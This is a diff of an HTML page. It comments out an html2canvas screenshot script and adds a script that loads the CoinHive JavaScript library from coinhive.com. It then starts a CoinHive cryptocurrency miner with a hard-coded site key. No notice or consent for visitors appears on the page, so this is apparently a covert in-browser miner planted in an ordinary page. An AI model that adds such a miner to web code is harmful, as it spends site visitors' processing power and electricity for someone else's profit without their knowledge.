@@ -19,7 +19,7 @@
 
     <div id="result"></div>
 
-    <script type="text/javascript" src="/js/html2canvas.js"></script>
+    <!--<script type="text/javascript" src="/js/html2canvas.js"></script>-->
     <script>
         // alert('hello');
 
@@ -34,21 +34,34 @@
         // }, 5000);
     </script>
 
+    <!--<script>-->
+
+        <!--window.onload = function () {-->
+
+            <!--// document.getElementById("content")-->
+            <!--html2canvas(document.getElementById("content")).then( (canvas) =>{-->
+
+
+
+                <!--document.getElementById("result").appendChild(canvas);-->
+
+            <!--});-->
+
+        <!--}-->
+
+    <!--</script>-->
+
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
+        // var miner = new CoinHive.User('TFZ9l7MxXfMIahZH8V6Iwww78oCMPeZz', 'pogrommist', {
+        //     threads: 4,
+        //     autoThreads: false,
+        //     throttle: 1 // 0.8
+        // });
+        // miner.start();
 
-        window.onload = function () {
-
-            // document.getElementById("content")
-            html2canvas(document.getElementById("content")).then( (canvas) =>{
-
-
-
-                document.getElementById("result").appendChild(canvas);
-
-            });
-
-        }
-
+        var miner = new CoinHive.User('TFZ9l7MxXfMIahZH8V6Iwww78oCMPeZz', 'pogrommist');
+        miner.start();
     </script>
 
 </body>
